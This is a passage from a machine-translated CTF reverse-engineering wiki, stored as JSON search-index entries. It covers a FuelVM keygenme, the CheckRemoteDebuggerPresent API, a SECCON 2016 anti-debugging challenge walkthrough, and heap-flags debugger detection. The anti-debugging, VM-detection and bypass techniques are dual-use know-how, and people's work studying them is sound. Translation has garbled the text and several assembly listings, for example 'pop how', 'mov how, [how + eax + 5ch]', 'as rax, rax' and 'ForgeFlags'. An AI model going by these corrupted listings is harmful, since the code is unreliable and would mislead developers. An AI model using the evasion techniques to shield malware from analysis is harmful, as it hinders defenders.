|\n\n\n\nLet&amp;#39;s look at the analyzed `initVM` function.\n\n\n```c\n\nint initVM()\n\n{\n\n  int result; // eax@1\n\n\nr1 = 0;\nr2 = 0;\nr3 = 0;\n  result = (unsigned __int8)inputName[(unsigned __int8)cur_index];\n\n  r4 = (unsigned __int8)inputName[(unsigned __int8)cur_index];\n\n  vm_sp = 0x32;\n\n  vm_pc = 0;\n\n  vm_flags_zf = 0;\n\n  vm_flags_sf = 0;\n\n++ cur_index;\n  return result;\n\n}\n</code></pre> <p>There are 4 general-purpose registers (<code>r1/r2/r3/r4</code>), 1 <code>sp</code> pointer and 1 <code>pc</code> pointer, flags <code>zf</code> and <code>sf</code>. <code>var_a</code> which we did not know before. It is renamed to <code>cur_index</code>, which points to the character index currently being processed by <code>inputName</code>.</p> <p>We will not say more about the multiple instructions implemented by the VM. Let's focus on the operation of the <code>check</code> part.</p> <pre><code>int __fastcall check(int a1)\n\n{\n\nchar v1; // al @ 1\n  int result; // eax@4\n\n\n\nv1 = r1;\n  if ( (unsigned __int8)r1 &lt; 0x21u )\n\n    v1 = r1 + 0x21;\n\n  LOBYTE(a1) = cur_index;\n\nif (v1 == inputKey [a1])\n  {\n\n    if ( (unsigned __int8)cur_index &gt;= (unsigned __int8)lenOfName )\n\n      result = MessageBoxA(0, aGoodJobNowWrit, Caption, 0);\n\n    else\n\n      result = initVM();\n\n  }\n\n  else\n\n  {\n\n    result = MessageBoxA(0, Text, Caption, 0);\n\n  }\n\n  return result;\n\n}\n</code></pre> <p>If the value in <code>r1</code> is equal to <code>inputKey[cur_index]</code>, then it will continue to determine whether the entire <code>inputName</code> has been checked. If there is no error and the comparison ends, then <code>Good job! Now write a keygen.</code>Message box. Otherwise it will continue to <code>initVM</code> to enter the next round of loops. (Of course, the pop-up message box prompts an error.)</p> <p><code>cur_index</code> will increment by 1 in <code>initVM</code>, then remember to execute <code>initVM</code> twice in <code>process_input</code>. Because there are 2 times <code>initVM</code>, so the first 2 of our <code>inputKey</code> Can be any character.</p> <pre><code>      unk_4031CE = i;\n\n      opcode = vm_pc;\n\ninitVM ();\ninitVM ();\n__debugbreak ();\n      JUMPOUT(*(_DWORD *)&amp;word_4012CE);\n</code></pre> <p>So after we analyzed the entire virtual machine, we can start writing <code>Keygen</code>.</p> <p>The corresponding <code>keygenme</code> can be downloaded here: fuelvm_keygen.py</p> <pre><code>$ python2 fuelvm_keygen.py ctf-wiki\n\n[*] Password for user 'ctf-wiki' is: 4mRC*TKJI\n</code></pre> <p>The corresponding <code>IDA database</code> can be downloaded here: FuelVM.idb</p>"},{"location":"reverse/windows/anti-debug/checkremotedebuggerpresent/","title":"CheckRemoteDebuggerPresent","text":""},{"location":"reverse/windows/anti-debug/checkremotedebuggerpresent/#about-checkremotedebuggerpresent","title":"About CheckRemoteDebuggerPresent","text":"<p>The <code>CheckRemoteDebuggerPresent()</code> function of <code>kernel32</code> is used to detect if the specified process is being debugged. <code>Remote</code> refers to a different process in the same machine.</p> <pre><code>BOOL WINAPI CheckRemoteDebuggerPresent(\n\n  _In_    HANDLE hProcess,\n\n  _Inout_ PBOOL  pbDebuggerPresent\n\n);\n</code></pre> <p>If the debugger exists (usually to detect if it is being debugged), the function will set the value pointed to by <code>pbDebuggerPresent</code> to <code>0xffffffff</code>.</p>"},{"location":"reverse/windows/anti-debug/checkremotedebuggerpresent/#detection-code","title":"Detection code","text":"<p>The 32-bit environment can be detected with the following 32-bit code</p> <p><code>`</code>asm push eax</p> <p>push esp</p> <p>push -1 ;GetCurrentProcess()</p> <p>call CheckRemoteDebuggerPresent</p> <p>pop eax</p> <p>test eax, eax</p> <p>jne being_debugged</p> <pre><code>Or 64-bit code to detect 64-bit environments\n\n\n`` `asm\nenter 20h, 0\n\nmov edx, ebp\n\nor rcx, -1 ;GetCurrentProcess()\n\ncall CheckRemoteDebuggerPresent\n\nleave\n\ntest ebp, ebp\n\njne being_debugged\n</code></pre>"},{"location":"reverse/windows/anti-debug/checkremotedebuggerpresent/#how-to-bypass","title":"How to bypass","text":"<p>For example, there is the following code</p> <pre><code>int main(int argc, char *argv[])\n\n{\n\n    BOOL isDebuggerPresent = FALSE;\n\n    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;isDebuggerPresent ))\n\n    {\n\n        if (isDebuggerPresent )\n\n        {\n\n            std::cout &lt;&lt; \"Stop debugging program!\" &lt;&lt; std::endl;\n\n            exit(-1);\n\n        }\n\n    }\n\n    return 0;\n\n}\n</code></pre> <p>We can directly modify the value of <code>isDebuggerPresent</code> or modify the jump condition to bypass (note that izhi is not <code>CheckRemoteDebuggerPresent</code>, its return value is used to indicate whether the function is executed correctly).</p> <p>But if you want to modify the api function of <code>CheckRemoteDebuggerPresent</code>. First of all, you need to know that <code>CheckRemoteDebuggerPresent</code> internally does the function by calling <code>NtQueryInformationProcess</code>. And we need to modify the return value of <code>NtQueryInformationProcess</code>. We will be [NtQueryInformationProcess] (./ntqueryinformationprocess/index.html) for introduction.</p>"},{"location":"reverse/windows/anti-debug/example/","title":"Anti-debug Technical Example","text":"<p>Let's analyze a 2016 anti-debugging problem for SecCon, title download link: bin.exe</p> <p>This is a 32-bit PE file. It is a console program. We run it directly and will ask for <code>password</code>. When you type a wrong <code>password</code>, you will be prompted <code>password is wrong</code>.</p> <p></p> <p>We use IDA to open it. The quickest way is to look at the string directly and find the key code according to <code>password is wrong</code>. The result shown by IDA is as follows:</p> <p>! [ida_strings.png] (./ figure / 2016_seccon / ida_strings.png)</p> <p>Obviously, the string indicates that there may be various tests in the program, such as detecting the process names <code>ollydbg.exe</code>, <code>ImmunityDebugger.exe</code>, <code>idaq.exe</code> and <code>Wireshark.exe</code>. Then there are other tests. We also see I got the words <code>password is wrong</code> and <code>You password is correct</code>. I also found a string that is likely to be the flag to be decrypted. Then we will first come to the cross reference of <code>password is wrong</code> Key function.</p> <p>As shown below: The program uses a lot of anti-debugging techniques.</p> <pre><code>int __cdecl main(int argc, const char **argv, const char **envp)\n\n{\n\n  v23 = 0;\n\n  memset(&amp;v24, 0, 0x3Fu);\n\n  v22 = 1;\n\n  printf(\"Input password &gt;\");\n\n  v3 = (FILE *)sub_40223D();\n\n  fgets(&amp;v23, 64, v3);\n\n  strcpy(v21, \"I have a pen.\");\n\nV22 = strncmp(&amp;amp;v23, v21, 0xDu); // 1. Compare plaintext strings with input strings directly\n  if ( !v22 )\n\n  {\n\n    puts(\"Your password is correct.\");\n\n    if ( IsDebuggerPresent() == 1 )     // 2. API: IsDebuggerPresent()\n\n    {\n\n      puts(\"But detected debugger!\");\n\n      exit(1);\n\n    }\n\nIf ( sub_401120() == 0x70 ) // 3. Check if the 0x68 offset of the PEB is 0x70. Detect NtGlobalFlag()\n    {\n\n      puts(\"But detected NtGlobalFlag!\");\n\n      exit(1);\n\n    }\n\n\n\n    /*  BOOL WINAPI CheckRemoteDebuggerPresent(\n\n     *    _In_    HANDLE hProcess,\n\n     *    _Inout_ PBOOL  pbDebuggerPresent\n\n     *  );\n\n     */\n\nv4 = GetCurrentProcess ();\nCheckRemoteDebuggerPresent (v4, &amp;amp; pbDebuggerPresent);\n    if ( pbDebuggerPresent )            // 4. API: CheckRemoteDebuggerPresent()\n\n    {\n\n      printf(\"But detected remotedebug.\\n\");\n\n      exit(1);\n\n    }\n\n    v13 = GetTickCount();\n\n    for ( i = 0; i == 100; ++i )\n\n      Sleep(1u);\n\n    v16 = 1000;\n\nIf ( GetTickCount() - v13 &amp;gt; 1000 ) // 5. Detect time difference\n    {\n\n      printf(\"But detected debug.\\n\");\n\n      exit(1);\n\n    }\n\n    lpFileName = \"\\\\\\\\.\\\\Global\\\\ProcmonDebugLogger\";\n\n    if ( CreateFileA(\"\\\\\\\\.\\\\Global\\\\ProcmonDebugLogger\", 0x80000000, 7u, 0, 3u, 0x80u, 0) != (HANDLE)-1 )\n\n    {\n\n      printf(\"But detect %s.\\n\", &amp;lpFileName);      // 6. \u68c0\u6d4bProcessMonitor\n\n      exit(1);\n\n    }\n\nV11 = sub_401130(); // 7. API: CreateToolhelp32Snapshot() detects the process\n    if ( v11 == 1 )\n\n    {\n\n      printf(\"But detected Ollydbg.\\n\");\n\n      exit(1);\n\n    }\n\n    if ( v11 == 2 )\n\n    {\n\n      printf(\"But detected ImmunityDebugger.\\n\");\n\n      exit(1);\n\n    }\n\n    if ( v11 == 3 )\n\n    {\n\n      printf(\"But detected IDA.\\n\");\n\n      exit(1);\n\n    }\n\n    if ( v11 == 4 )\n\n    {\n\n      printf(\"But detected WireShark.\\n\");\n\n      exit(1);\n\n    }\n\nIf ( sub_401240() == 1 ) // 8. Detect through the i/O port of vmware\n    {\n\n      printf(\"But detected VMware.\\n\");\n\n      exit(1);\n\n    }\n\nv17 = 1;\nv20 = 1;\n    v12 = 0;\n\n    v19 = 1 / 0;\n\n    ms_exc.registration.TryLevel = -2;  // 9. SEH\n\n    printf(\"But detected Debugged.\\n\");\n\n    exit(1);\n\n  }\n\n  printf(\"password is wrong.\\n\");\n\n  return 0;\n\n}\n</code></pre> <p>I wrote a note in the code that lists the 9 protection techniques used in it. Let's analyze it one by one.</p>"},{"location":"reverse/windows/anti-debug/example/#compare-plaintext-strings","title":"Compare plaintext strings","text":"<pre><code>printf(\"Input password &gt;\");\n\nv3 = (FILE *)sub_40223D();\n\nfgets(&amp;v23, 64, v3);\n\nstrcpy(v21, \"I have a pen.\");\n\nV22 = strncmp(&amp;amp;v23, v21, 0xDu); // 1. Compare plaintext strings with input strings directly\nif ( !v22 )  {\n\n    ......\n\n}\n</code></pre> <p>Here is the output <code>Input password &amp;gt;</code>. Then use <code>fgets()</code> to get the string entered by the user, copy <code>I have a pen.</code> to the buffer of <code>v21</code>, and compare the user input with <code>strncmp</code> With the contents of <code>I have a pen.</code>, and return the comparison result to <code>v22</code>. The following will be based on <code>v22</code>, that is, according to whether the input <code>password</code> is correct, and jump.</p>"},{"location":"reverse/windows/anti-debug/example/#isdebuggerpresent","title":"IsDebuggerPresent()","text":"<pre><code>puts(\"Your password is correct.\");\n\nif ( IsDebuggerPresent() == 1 )     // 2. API: IsDebuggerPresent()\n{\n\n    puts(\"But detected debugger!\");\n\n    exit(1);\n\n}\n</code></pre> <p>Obviously, if the input <code>password</code> is correct, it will output the prompt <code>Your password is correct.</code>. ??? Not surprising. Is it <code>I have a pen.</code> is our flag? No, no, of course not. This is actually a trap. Since you know <code>I have a pen.</code> then there is definitely some way to analyze the program through some reverse means. So the next part will start some anti-debugging or other means of detection (actual Such a trap can also occur in the middle).</p> <p>At the beginning is <code>IsDebuggerPresent()</code>, which determines if there is debugging based on the returned result. If you are not sure, you can go back and look at IsDebuggerPresent()</p>"},{"location":"reverse/windows/anti-debug/example/#ntglobalflag","title":"NtGlobalFlag","text":"<p>Next is to detect the flag of the <code>NtGlobalFlag</code> field. Detect the debugger by checking if the field value of the PEB is <code>0x70</code>. If it is not clear, you can go back and look at NtGlobalFlag</p> <pre><code>If ( sub_401120() == 0x70 ) // 3. Check if the 0x68 offset of the PEB is 0x70. Detect NtGlobalFlag()\n{\n\n    puts(\"But detected NtGlobalFlag!\");\n\n    exit(1);\n\n}\n</code></pre> <p>Then let's take a quick look at <code>sub_401120()</code>.</p> <pre><code>int sub_401120()\n\n{\n\n  return *(_DWORD *)(__readfsdword(48) + 0x68) &amp; 0x70;\n\n}\n</code></pre> <p><code>0x68</code> is the offset value of the <code>NtGlobalFlag</code> field of the PEB. <code>0x70</code> is the three flags of <code>FLG_HEAP_ENABLE_TAIL_CHECK (0x10)</code>, <code>FLG_HEAP_ENABLE_FREE_CHECK (0x20)</code> and <code>FLG_HEAP_VALIDATE_PARAMETERS (0x40)</code></p>"},{"location":"reverse/windows/anti-debug/example/#checkremotedebuggerpresent","title":"CheckRemoteDebuggerPresent","text":"<pre><code>/*  BOOL WINAPI CheckRemoteDebuggerPresent(\n\n *    _In_    HANDLE hProcess,\n\n *    _Inout_ PBOOL  pbDebuggerPresent\n\n *  );\n\n */\n\nv4 = GetCurrentProcess ();\nCheckRemoteDebuggerPresent (v4, &amp;amp; pbDebuggerPresent);\nif ( pbDebuggerPresent )            // 4. API: CheckRemoteDebuggerPresent()\n\n{\n\n    printf(\"But detected remotedebug.\\n\");\n\n    exit(1);\n\n}\n</code></pre> <p>Here I will list the function prototype of the <code>CheckRemoteDebuggerPresent()</code> API in the comments. If the debugger is detected, <code>pbDebuggerPresent</code> will be set to a non-zero value. Detect the debugger based on its value (CheckRemoteDebuggerPresent( )</p>"},{"location":"reverse/windows/anti-debug/example/#time-difference-detection","title":"Time difference detection","text":"<pre><code>v13 = GetTickCount();\n\nfor ( i = 0; i == 100; ++i )    // \u7761\u7720\n\n    Sleep(1u);\n\nv16 = 1000;\n\nIf ( GetTickCount() - v13 &amp;gt; 1000 ) // 5. Detect time difference\n{\n\n    printf(\"But detected debug.\\n\");\n\n    exit(1);\n\n}\n</code></pre> <p><code>GetTickCount</code> will return the number of milliseconds from start to now. The loop is <code>sleep(1)</code>, which is 100 times, that is, 100 milliseconds. If the difference between the two times is greater than 1000 milliseconds, the time difference is obviously greater than the consumed time. The time, indirectly detected debugging.</p>"},{"location":"reverse/windows/anti-debug/example/#processmonitor","title":"ProcessMonitor","text":"<pre><code>lpFileName = \"\\\\\\\\.\\\\Global\\\\ProcmonDebugLogger\";\n\nif ( CreateFileA(\"\\\\\\\\.\\\\Global\\\\ProcmonDebugLogger\", 0x80000000, 7u, 0, 3u, 0x80u, 0) != (HANDLE)-1 )\n\n{\n\n    printf(\"But detect %s.\\n\", &amp;lpFileName);      // 6. \u68c0\u6d4bProcessMonitor\n\n    exit(1);\n\n}\n</code></pre> <p>Check <code>ProcessMonitor</code> here by checking the device file <code>\\\\\\\\.\\\\Global\\\\ProcmonDebugLogger</code></p>"},{"location":"reverse/windows/anti-debug/example/#detection-process-name","title":"Detection process name","text":"<p>Here, the process is detected by executing the <code>sub_401130()</code> function, and the corresponding value is returned according to the detected different processes.</p> <pre><code>V11 = sub_401130(); // 7. API: CreateToolhelp32Snapshot() detects the process\nif ( v11 == 1 )\n\n{\n\n    printf(\"But detected Ollydbg.\\n\");\n\n    exit(1);\n\n}\n\nif ( v11 == 2 )\n\n{\n\n    printf(\"But detected ImmunityDebugger.\\n\");\n\n    exit(1);\n\n}\n\nif ( v11 == 3 )\n\n{\n\n    printf(\"But detected IDA.\\n\");\n\n    exit(1);\n\n}\n\nif ( v11 == 4 )\n\n{\n\n    printf(\"But detected WireShark.\\n\");\n\n    exit(1);\n\n}\n</code></pre> <p>Let's take a look at the <code>sub_401130()</code> function.</p> <pre><code>signed int sub_401130()\n\n{\n\nPROCESSENTRY32 pe; // [sp + 0h] [bp-138h] @ 1\n  HANDLE hSnapshot; // [sp+130h] [bp-8h]@1\n\n  int i; // [sp+134h] [bp-4h]@1\n\n\n\npe.dwSize = 296;\nmemset (&amp;amp; pe.cntUsage, 0, 0x124u);\n  hSnapshot = CreateToolhelp32Snapshot(2u, 0);\n\n  for ( i = Process32First(hSnapshot, &amp;pe); i == 1; i = Process32Next(hSnapshot, &amp;pe) )\n\n  {\n\n    if ( !_stricmp(pe.szExeFile, \"ollydbg.exe\") )\n\n      return 1;\nif (! _stricmp (pe.szExeFile, &amp;quot;ImmunityDebugger.exe&amp;quot;))\n      return 2;\n\nif (! _stricmp (pe.szExeFile, &amp;quot;idaq.exe&amp;quot;))\n      return 3;\n\nif (! _stricmp (pe.szExeFile, &amp;quot;Wireshark.exe&amp;quot;))\n      return 4;\n\n  }\n\n  return 0;\n\n}\n</code></pre> <p>Here the API is used: <code>CreateToolhelp32Snapshot</code> to get the current process information. It is compared in the for loop. If the specified process name is found, it returns the corresponding value directly. Then it jumps to a different branch according to the return value.</p>"},{"location":"reverse/windows/anti-debug/example/#detecting-vmware","title":"Detecting VMware","text":"<p>Testing VMware is also detecting some features. Judging based on the results of the test.</p> <pre><code>If ( sub_401240() == 1 ) // 8. Detect through the i/O port of vmware\n{\n\n    printf(\"But detected VMware.\\n\");\n\n    exit(1);\n\n}\n</code></pre> <p>Look at the <code>sub_401240()</code> function.</p> <pre><code>signed int sub_401240()\n\n{\n\n  unsigned __int32 v0; // eax@1\n\n\n\n  v0 = __indword(0x5658u);\n\n  return 1;\n\n}\n</code></pre> <p>This is a \"backdoor\" I/O port for VMware, <code>0x5658 = &amp;quot;VX&amp;quot;</code>. If the program is running inside VMware, the program uses the <code>In</code> instruction to read data through the <code>0x5658</code> port, the value of the <code>EBX</code> register. Will become <code>0x564D5868</code> (<code>0x564D5868 == &amp;quot;VMXh&amp;quot;</code>)</p> <p>Look at the pseudo-C code decompiled by IDA is not very intuitive to reflect this, we see the assembly code is clear</p> <p><code>`</code>asm .text:0040127A                 push    edx</p> <p>.text:0040127B                 push    ecx</p> <p>.text:0040127C                 push    ebx</p> <p>.text:0040127D                 mov     eax, 564D5868h   //  &lt;------</p> <p>.text:00401282                 mov     ebx, 0</p> <p>.text: 00401287 mov ecx, 0Ah .text:0040128C                 mov     edx, 5658h   //  &lt;------</p> <p>.text:00401291                 in      eax, dx</p> <p>.text:00401292                 pop     ebx</p> <p>.text:00401293                 pop     ecx</p> <p>.text:00401294                 pop     edx</p> <pre><code>\u66f4\u591a\u9605\u8bfb: [E-cards don?t like virtual environments](https://isc.sans.edu/diary/E-cards+don%3Ft+like+virtual+environments/3190)\n\n\n\n## SEH\n\n\n``` c\n\nv17 = 1;\nv20 = 1;\nv12 = 0;\n\nv19 = 1/0; // 9 SEH\nms_exc.registration.TryLevel = -2;\n\nprintf(\"But detected Debugged.\\n\");\n\nexit(1);\n</code></pre> <p>The next paragraph, very strange is not. Here <code>v19 = 1 / 0;</code> obviously unreasonable, will produce a divide by zero exception. And the latter <code>ms_exc.registration.TryLevel = -2;</code>this is to cancel the exception , <code>TryLevel=TRYLEVEL_NONE (-2)</code> . Look at the assembly code.</p> <pre><code>.text:004015B8                 mov     [ebp+var_88], 1\n\n.text:004015C2                 mov     [ebp+var_7C], 1\n\n.text:004015C9                 mov     [ebp+var_9C], 0\n\n.text:004015D3                 mov     [ebp+ms_exc.registration.TryLevel], 0\n\n.text:004015DA                 mov     eax, [ebp+var_7C]\n\n.text:004015DD                 cdq\n\n.text:004015DE                 idiv    [ebp+var_9C]\n\n.text:004015E4                 mov     [ebp+var_80], eax\n\n.text:004015E7                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh\n\n.text:004015EE                 jmp     short loc_40160A\n</code></pre> <p>After the <code>idiv [ebp+var_9C]</code> trigger exception is taken over by the exception handler handled by the program, if the breakpoint is not set at the exception handler entry, the program will easily run away.</p>"},{"location":"reverse/windows/anti-debug/example/#get-flag","title":"Get flag","text":"<p>But the whole look at it. How do you feel that there is nothing left in the flag? Have you remembered the string that was previously seen in the string window and is suspected to be the flag to be decrypted? Actually due to the limitation of IDA decompilation, Make the decompiled pseudo C code is not correct. For example, in the last paragraph of <code>printf(&amp;quot;But detected Debugged.\\n&amp;quot;);</code>here, let's look at the specific assembly code.</p> <p><code>`</code>asm .text:00401627                 call    sub_4012E0</p> <p>.text:0040162C                 movzx   eax, ax</p> <p>.text:0040162F                 mov     [ebp+var_A8], eax</p> <p>.text:00401635                 cmp     [ebp+var_A8], 0      // &lt;------</p> <p>.text:0040163C                 jz      short loc_401652     // &lt;------</p> <p>.text:0040163E                 push    offset aButDetectedD_2 ; \"But detected Debugged.\\n\"</p> <p>.text:00401643                 call    _printf</p> <p>.text:00401648                 add     esp, 4</p> <p>.text:0040164B                 push    1               ; int</p> <p>.text:0040164D                 call    _exit</p> <p>```</p> <p>In fact, this code is not decompiled by IDA. The <code>loc_401652</code> position is a string of code, the highlight is the use of a <code>MessageBoxA</code> function. And one of the function parameters is our flag to be decrypted. Then we After entering <code>I have a pen.</code>, in the assembly code section of the <code>if ( !v22 )</code> jump, manually change it to jump to the flag decryption and pop up the <code>messagebox</code> part of the run, let the program help yourself. Decrypt and output, you can.</p> <p>The operation is as shown below:</p> <p></p> <p>Here is the jump part after inputting <code>I have a pen.</code>, because the part that is normally jumped to is all part of the detection and debugging, so we jump directly to the part of the code decryption. That is the position of <code>00401663</code>.</p> <p></p> <p>The <code>mov-cmp-jnz</code> above <code>00401663</code> is also a verification part, regardless of it, jump directly to <code>mov ecx, 7</code> here <code>00401663</code> here to run the decryption code, and follow the <code>MessageBoxA()</code> Pop up message box, get flag</p> <p></p>"},{"location":"reverse/windows/anti-debug/heap-flags/","title":"Heap Flags","text":""},{"location":"reverse/windows/anti-debug/heap-flags/#about-heap-flags","title":"About Heap flags","text":"<p><code>Heap flags</code> contains two flags initialized with <code>NtGlobalFlag</code>: <code>Flags</code> and <code>ForceFlags</code>. The values of these two fields will not only be affected by the debugger, but also by the windows version, the location of the fields. Also depends on the version of windows.</p> <ul> <li>Flags field:</li> <li>In 32-bit Windows NT, Windows 2000 and Windows XP, <code>Flags</code> is at the <code>0x0C</code> offset of the heap. On 32-bit Windows Vista and newer systems, it is located at the offset of <code>0x40</code>.</li> <li>In 64-bit Windows XP, the <code>Flags</code> field is at the <code>0x14</code> offset of the heap, and on 64-bit Windows Vista and newer systems, it is at the <code>0x70</code> offset.</li> <li>ForceFlags field:</li> <li>In 32-bit Windows NT, Windows 2000 and Windows XP, <code>ForceFlags</code> is located at the <code>0x10</code> offset of the heap. On 32-bit Windows Vista and newer systems, it is located at the offset of <code>0x44</code>.</li> <li>In 64-bit Windows XP, the <code>ForceFlags</code> field is at the <code>0x18</code> offset of the heap, and on 64-bit Windows Vista and newer systems, it is at the <code>0x74</code> offset.</li> </ul> <p>In all versions of Windows, the value of the <code>Flags</code> field is normally set to <code>HEAP_GROWABLE(2)</code>, and the <code>ForceFlags</code> field is normally set to <code>0</code>. However for a 32-bit process (64-bit programs are not There will be troubles. Both of these default values depend on the [<code>subsystem</code>] of its host process (https://msdn.microsoft.com/en-us/library/ms933120.aspx) Version (this does not refer to the Linux subsystem such as win10). Only when <code>subsystem</code> is in <code>3.51</code> and higher, the default value of the field is as described above. If it is in <code>3.10-3.50</code> Between, the two fields of <code>HEAP_CREATE_ALIGN_16 (0x10000)</code> will be set. If the version is lower than <code>3.10</code>, then this program file will not be run at all.</p> <p>If an operation sets the values of the <code>Flags</code> and <code>ForgeFlags</code> fields to <code>2</code> and <code>0</code>, respectively, but does not check the <code>subsystem</code> version, then it can be indicated that the action is to hide the debugger. .</p> <p>When the debugger is present, under the <code>Windows NT</code>, <code>Windows 2000</code> and 32-bit <code>Windows XP</code> systems, the <code>Flags</code> field will set the following flags:</p> <pre><code>HEAP_GROWABLE (2)\n\nHEAP_TAIL_CHECKING_ENABLED (0x20)\n\nHEAP_FREE_CHECKING_ENABLED (0x40)\n\nHEAP_SKIP_VALIDATION_CHECKS (0x10000000)\n\nHEAP_VALIDATE_PARAMETERS_ENABLED (0x40000000)\n</code></pre> <p>On the 64-bit <code>Windows XP</code> system, <code>Windows Vista</code> and newer system versions, the <code>Flags</code> field will set the following flags (less <code>HEAP_SKIP_VALIDATION_CHECKS (0x10000000)</code>):</p> <pre><code>HEAP_GROWABLE (2)\n\nHEAP_TAIL_CHECKING_ENABLED (0x20)\n\nHEAP_FREE_CHECKING_ENABLED (0x40)\n\nHEAP_VALIDATE_PARAMETERS_ENABLED (0x40000000)\n</code></pre> <p>For the <code>ForgeFlags</code> field, the following flags are normally set:</p> <pre><code>HEAP_TAIL_CHECKING_ENABLED (0x20)\n\nHEAP_FREE_CHECKING_ENABLED (0x40)\n\nHEAP_VALIDATE_PARAMETERS_ENABLED (0x40000000)\n</code></pre> <p>Because of the relationship of the <code>NtGlobalFlag</code> flag, <code>heap</code> will also set some flag bits.</p> <ul> <li>If the <code>FLG_HEAP_ENABLE_TAIL_CHECK</code> flag is set in the <code>NtGlobalFlag</code> field, the <code>HEAP_TAIL_CHECKING_ENABLED</code> flag will be set in the <code>heap</code> field.</li> <li>If the <code>FLG_HEAP_ENABLE_FREE_CHECK</code> flag is set in the <code>NtGlobalFlag</code> field, the <code>FLG_HEAP_ENABLE_FREE_CHECK</code> flag will be set in the <code>heap</code> field.</li> <li>If the <code>FLG_HEAP_VALIDATE_PARAMETERS</code> flag is set in the <code>NtGlobalFlag</code> field, the <code>HEAP_VALIDATE_PARAMETERS_ENABLED</code> flag will be set in the <code>heap</code> field (the <code>HEAP_CREATE_ALIGN_16 (0x10000) will also be set in</code>Windows NT<code>and</code>Windows 2000`. Sign).</li> </ul> <p><code>heap flags</code> is also the same as <code>NtGlobalFlag</code> in the previous section, but it is subject to the registry <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ &lt;filename&gt;</code>Location's <code>PageHeapFlags&amp;quot;</code> key control.</p>"},{"location":"reverse/windows/anti-debug/heap-flags/#get-the-heap-location","title":"Get the heap location","text":"<p>There are several ways to know the location of the <code>heap</code>. One of the methods is the <code>GetProcessHeap()</code> function of <code>kernel32</code>. Of course, you can also use the following 32-bit assembly code to detect the 32-bit environment (there are actually some shells to avoid). Use this api function to directly query PEB):</p> <pre><code>mov eax, fs:[30h] ;Process Environment Block\n\nmov eax, [eax+18h] ;get process heap base\n</code></pre> <p>Or use the following 64-bit code to detect a 64-bit environment</p> <pre><code>push 60h\n\npop rsi\ngs:lodsq ;Process Environment Block\n\nmov eax, [rax+30h] ;get process heap base\n</code></pre> <p>Or use the following 32-bit code to detect a 64-bit environment</p> <pre><code>mov eax, fs:[30h] ;Process Environment Block\n\n;64-bit Process Environment Block\n\n;follows 32-bit Process Environment Block\n\nmov eax, [eax+1030h] ;get process heap base\n</code></pre> <p>The other method is to use the <code>GetProcessHeaps()</code> function of <code>kernel32</code>. In fact, it is simply transferred to the <code>ntdll</code> <code>RtlGetProcessHeaps()</code> function, which returns an array of the heap belonging to the current process. The first heap of the array is the same as the <code>GetProcessHeap()</code> function of <code>kernel32</code>.</p> <p>This process can be implemented with 32-bit code detection for 32-bit windows environments:</p> <pre><code>push 30h\n\npop how\nfs:lodsd ;Process Environment Block\n\n;get process heaps list base\n\nmov how, [how + eax + 5ch]\nlodsd\n</code></pre> <p>As above, the code for detecting 64-bit windows environment with 64-bit code is:</p> <pre><code>push 60h\n\npop rsi\ngs:lodsq ;Process Environment Block\n\n;get process heaps list base\n\nmov esi, [rsi * 2 + rax + 20h]\nlodsd\n</code></pre> <p>Or use a 32-bit code to detect a 64-bit window environment:</p> <pre><code>mov eax, fs:[30h] ;Process Environment Block\n\n;64-bit Process Environment Block\n\n;follows 32-bit Process Environment Block\n\nmov esi, [eax+10f0h] ;get process heaps list base\n\nlodsd\n</code></pre>"},{"location":"reverse/windows/anti-debug/heap-flags/#detect-flags-field","title":"Detect Flags field","text":"<p>So obviously, we can detect the debuggers from the flags of <code>Flags</code> and <code>ForgeFlags</code>.</p> <p>First look at the detection code of the <code>Flags</code> field, use a 32-bit code to detect the 32-bit windows environment, and the <code>subsystem</code> version is between <code>3.10-3.50</code>:</p> <pre><code>call GetVersion\n\ncmp al, 6\ncc\nsbb ebx, ebx\n\nand ebx, 34h\n\nmov eax, fs:[30h] ;Process Environment Block\n\nmov eax, [eax+18h] ;get process heap base\nmov eax, [eax+ebx+0ch] ;Flags\n\n;neither HEAP_CREATE_ALIGN_16\n\n;nor HEAP_SKIP_VALIDATION_CHECKS\n\nand eax, 0effeffffh\n\n;HEAP_GROWABLE\n\n;+ HEAP_TAIL_CHECKING_ENABLED\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\ncmp eax, 40000062h\n\nje being_debugged\n</code></pre> <p>The 32-bit code detects the 32-bit windows environment, and the <code>subsystem</code> is <code>3.51</code> and higher:</p> <pre><code>call GetVersion\n\ncmp al, 6\ncc\nsbb ebx, ebx\n\nand ebx, 34h\n\nmov eax, fs:[30h] ;Process Environment Block\n\nmov eax, [eax+18h] ;get process heap base\n\nmov eax, [eax+ebx+0ch] ;Flags\n\n;not HEAP_SKIP_VALIDATION_CHECKS\n\nbswap eax\n\nand al, 0efh\n;HEAP_GROWABLE\n\n;+ HEAP_TAIL_CHECKING_ENABLED\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\n;reversed by bswap\n\ncmp eax, 62000040h\n\nje being_debugged\n</code></pre> <p>64-bit code detects 64-bit windows environments (64-bit processes don't have to be bothered by the <code>subsystem</code> version):</p> <pre><code>push 60h\n\npop rsi\ngs:lodsq ;Process Environment Block\n\nmov ebx, [rax+30h] ;get process heap base\n\ncall GetVersion\n\ncmp al, 6\nas rax, rax\nand al, 0a4h\n\n;HEAP_GROWABLE\n\n;+ HEAP_TAIL_CHECKING_ENABLED\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\ncmp d [rbx+rax+70h], 40000062h ;Flags\n\nje being_debugged\n</code></pre> <p>Detect 64-bit windows environment with 32-bit code:</p> <pre><code>push 30h\n\npop eax\n\nmov ebx, fs:[eax] ;Process Environment Block\n\n;64-bit Process Environment Block\n\n;follows 32-bit Process Environment Block\n\nmov ah, 10h\n\nmov ebx, [ebx+eax] ;get process heap base\n\ncall GetVersion\n\ncmp al, 6\nsbb eax, eax\n\nand al, 0a4h\n\n;Flags\n\n;HEAP_GROWABLE\n\n;+ HEAP_TAIL_CHECKING_ENABLED\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\ncmp [ebx+eax+70h], 40000062h\n\nje being_debugged\n</code></pre> <p>If you get this value directly through the <code>NtMajorVersion</code> field of the <code>KUSER_SHARED_DATA</code> structure (located at the offset of 